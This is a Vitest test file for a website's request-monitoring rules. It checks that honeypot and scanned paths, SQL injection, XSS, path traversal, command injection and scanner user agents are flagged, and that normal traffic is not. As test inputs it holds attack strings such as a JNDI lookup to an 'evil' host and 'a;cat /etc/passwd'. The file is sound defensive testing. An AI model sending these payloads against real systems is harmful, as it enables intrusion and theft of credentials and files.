import { describe, expect, it } from "vitest";
import { inspectRequest, isKnownBot, safeDecode } from "@/monitoring/rules";

const browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36";
const inspect = (path: string, search = "", options: { method?: string; ua?: string | null } = {}) =>
  inspectRequest({ method: options.method ?? "GET", path, search, userAgent: options.ua === undefined ? browser : options.ua });
const categories = (path: string, search = "", options: { method?: string; ua?: string | null } = {}) => inspect(path, search, options).map((detection) => detection.category);

describe("attack detection", () => {
  it("flags honeypots and scanned paths", () => {
    expect(categories("/.env")).toEqual(["honeypot", "path_scan"]);
    expect(categories("/wp-login.php")).toEqual(["honeypot", "path_scan"]);
    expect(inspect("/.env").reduce((sum, detection) => sum + detection.score, 0)).toBe(35);
    expect(categories("/wp-admin/setup-config.php")).toContain("path_scan");
    expect(categories("/vendor/phpunit/src/Util/PHP/eval-stdin.php")).toContain("path_scan");
    expect(categories("/index.php")).toEqual(["path_scan"]);
    expect(categories("/acces-interne-sauvegarde")).toEqual(["honeypot"]);
  });

  it("flags SQL injection, XSS, traversal and command injection", () => {
    expect(categories("/projets", "?id=1 UNION SELECT username, password FROM users")).toContain("sqli");
    expect(categories("/blog", "?q=%27%20OR%20%271%27%3D%271")).toContain("sqli");
    expect(categories("/blog", "?q=1;SELECT pg_sleep(5)")).toContain("sqli");
    expect(categories("/blog", "?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")).toContain("xss");
    expect(categories("/blog", "?q=%253Cscript%253E")).toContain("xss");
    expect(categories("/media/..%2f..%2fetc%2fpasswd")).toContain("path_traversal");
    expect(categories("/api/t", "?x=${jndi:ldap://evil/a}")).toContain("cmd_injection");
    expect(categories("/contact", "?name=a;cat /etc/passwd")).toEqual(expect.arrayContaining(["cmd_injection", "path_traversal"]));
  });

  it("flags scanners, forbidden methods and empty user agents", () => {
    expect(categories("/", "", { ua: "sqlmap/1.7.2#stable (https://sqlmap.org)" })).toContain("bad_bot");
    expect(categories("/", "", { method: "TRACE" })).toContain("forbidden_method");
    expect(categories("/admin", "", { ua: "" })).toContain("bad_bot");
    expect(categories("/auth/login", "", { ua: "python-requests/2.31" })).toContain("bad_bot");
  });

  it("does not flag normal traffic", () => {
    expect(inspect("/")).toEqual([]);
    expect(inspect("/blog", "?q=selection des projets from Bukavu")).toEqual([]);
    expect(inspect("/blog", "?q=c%27est%20l%27union%20qui%20fait%20la%20force")).toEqual([]);
    expect(inspect("/projets/medhub")).toEqual([]);
    expect(inspect("/en/blog/mastering-nextjs-app-router", "?utm_source=linkedin&utm_medium=social")).toEqual([]);
    expect(inspect("/devis", "?service=mobile")).toEqual([]);
    expect(inspect("/media/2026/11/photo-1200.webp")).toEqual([]);
    expect(inspect("/blog", "?q=onload%20performance")).toEqual([]);
    expect(inspect("/feed.xml", "", { ua: "curl/8.4.0" })).toEqual([]);
    expect(inspect("/", "", { method: "HEAD" })).toEqual([]);
  });

  it("keeps excerpts short and decodes twice", () => {
    expect(safeDecode("%253Cb%253E")).toBe("<b>");
    const [detection] = inspect("/blog", `?q=${"a".repeat(2000)}%20UNION%20SELECT%201`);
    expect(detection.excerpt.length).toBeLessThanOrEqual(500);
  });

  it("recognizes crawlers for the audience statistics", () => {
    expect(isKnownBot("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")).toBe(true);
    expect(isKnownBot("WhatsApp/2.23.20.0")).toBe(true);
    expect(isKnownBot("Googlebot/2.1")).toBe(true);
    expect(isKnownBot("Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)")).toBe(true);
    expect(isKnownBot("Mozilla/5.0 (compatible; bingbot/2.0)")).toBe(true);
    expect(isKnownBot(browser)).toBe(false);
  });
});
